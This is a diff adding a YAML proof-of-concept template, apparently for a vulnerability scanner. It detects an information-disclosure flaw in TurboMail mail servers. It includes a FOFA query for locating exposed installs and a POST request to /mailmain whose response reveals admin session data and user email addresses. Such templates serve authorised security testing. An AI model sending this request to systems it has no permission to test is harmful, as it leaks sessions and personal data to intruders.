@@ -1,0 +1,18 @@
+id: poc-yaml-turbomail-mailmain-info-leak
+info:
+  name: TurboMail mailmain 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: turbomail
+  fofa: app="TurboMail" || body="maintlogin.jsp" || body="tmw/1/getpassword.jsp"
+requests:
+- method: POST
+  path: /mailmain
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: type=pm
+  expression: status_code == 200 && contains(body,"SessinonAdmin ht_sessions") &&
+    contains(body,"CachePool") && contains(body,"MailIndexCache") && matches(body,"user:([A-Za-z.]+@[A-Za-z.]+.com)")
+variables: {}
+transport: http
